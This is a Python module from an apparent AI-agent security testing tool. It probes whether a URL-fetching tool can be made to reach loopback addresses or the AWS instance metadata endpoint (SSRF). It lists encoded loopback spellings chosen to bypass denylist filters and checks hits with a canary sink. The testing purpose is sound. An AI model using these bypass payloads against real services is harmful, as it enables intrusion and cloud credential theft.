"""Network egress abuse (SSRF): no LLM, no injection — call a URL-fetching
tool directly with addresses it should never be able to reach and see
whether a real, deterministic code-level check confines it, or it just
fetches whatever's asked for. Model-free by design, sibling to
path_traversal.py: whether a URL-fetching tool restricts its own
destinations is entirely a target-owned code property, no model involved
anywhere.

Two payload categories:
1. Loopback trap (confirmed tier) — the tool is asked to fetch the exact
   local address gaslight's own sink is listening on, under the host
   spellings core/sink.py's loopback_hosts() returns: plain loopback
   ("127.0.0.1", "localhost") first, then the ENCODED loopback forms
   (decimal 2130706433, hex 0x7f000001, shorthand 127.1/127.0.1) that the OS
   resolver still sends to 127.0.0.1 — these bypass a server that denylists
   only the literal loopback strings, the most common SSRF-filter mistake.
   (Octal, trailing-dot, and IPv6 "[::1]" are omitted — not portably
   reachable / need a dual-stack sink — and an unreachable payload can't be
   proven; see core/sink.py.) Plus whatever
   GASLIGHT_EXTRA_SINK_HOSTS adds — e.g. a Docker network alias, when the
   target runs in a network namespace where plain loopback resolves to the
   target's own container, not this process. Unlike
   path_traversal.py's text-signature proof, this category's proof is
   sink-based: a canary token is embedded in the request URL, and a hit is
   whatever the sink itself physically received (Sink.received()), not
   anything read out of the tool's own response text. This is the same
   deterministic "it showed up at a server we control" proof
   injection_exfil.py already relies on, just triggered by a direct call
   instead of a tricked model.
2. Cloud metadata probe (best-effort tier), tried only if category 1 found
   nothing — the AWS Instance Metadata Service v1 address
   (169.254.169.254), unauthenticated by default in the vulnerable case,
   the exact mechanism the 2019 Capital One breach used. Accepted as a hit
   only if the response contains "ami-id", a string specific enough to
   real AWS metadata that it won't appear in an ordinary failed-connection
   response — best-effort because most environments running this probe
   won't be on AWS at all, so a non-hit here proves nothing.

Fetching a URL isn't destructive, so the real call always happens
regardless of --safe, same as path_traversal.py. What --safe gates is what
gets stored: by default the response is masked and hard-truncated
(core/secrets_scan.py's redact_and_truncate()) before it ever reaches a
Finding; --no-safe stores the full, unmasked response.
"""

from __future__ import annotations

from gaslight.core.attacks.base import AttackModule, Finding
from gaslight.core.canary import mint
from gaslight.core.llm import LLMProvider
from gaslight.core.schema import find_network_tool, naive_arguments
from gaslight.core.secrets_scan import redact_and_truncate
from gaslight.core.sink import Sink, loopback_hosts
from gaslight.core.target import Target

_METADATA_URL = "http://169.254.169.254/latest/meta-data/"
_METADATA_SIGNATURE = "ami-id"
_PREVIEW_LENGTH = 150


class SsrfProbeAttack(AttackModule):
    key = "ssrf-probe"
    name = "Network Egress Abuse (SSRF)"
    description = (
        "Calls a URL-fetching tool directly with loopback and cloud-metadata addresses — "
        "no model, no injection — and checks whether a real code-level check confines it "
        "to its intended destinations."
    )

    def __init__(self, *, safe: bool = True) -> None:
        if not isinstance(safe, bool):
            raise TypeError(f"safe must be a bool, got {type(safe).__name__}")
        self._safe = safe

    async def run(self, target: Target, provider: LLMProvider, sink: Sink) -> Finding:
        # provider is accepted to satisfy the AttackModule interface but
        # unused — this attack never invokes a model, that's the point.
        tool, address_field = find_network_tool(target.tools)
        if tool is None or address_field is None:
            return Finding(
                attack_key=self.key,
                fired=False,
                reason="no viable URL-fetching tool with an address-like field to probe.",
                attempted=False,
            )

        canary = mint("ssrf")
        for host in loopback_hosts():
            url = f"http://{host}:{sink.port}/collect?t={canary.token}"
            args = naive_arguments(tool.input_schema, exclude=address_field)
            args[address_field] = url
            result = await target.call_tool(tool.name, args)
            if sink.received(canary.token) is not None:
                text = Target.result_text(result)
                preview = text if not self._safe else redact_and_truncate(text, _PREVIEW_LENGTH)
                return Finding(
                    attack_key=self.key,
                    fired=True,
                    reason=(
                        f"{tool.name} reached an out-of-scope address via "
                        f"{address_field}={url!r} (confirmed) — response: {preview!r}"
                    ),
                )

        args = naive_arguments(tool.input_schema, exclude=address_field)
        args[address_field] = _METADATA_URL
        result = await target.call_tool(tool.name, args)
        if not result.is_error:
            text = Target.result_text(result)
            if _METADATA_SIGNATURE in text:
                preview = text if not self._safe else redact_and_truncate(text, _PREVIEW_LENGTH)
                return Finding(
                    attack_key=self.key,
                    fired=True,
                    reason=(
                        f"{tool.name} reached an out-of-scope address via "
                        f"{address_field}={_METADATA_URL!r} (best-effort) — response: {preview!r}"
                    ),
                )

        return Finding(
            attack_key=self.key,
            fired=False,
            reason=f"{tool.name} — no probed destination reached an address outside its intended scope.",
        )
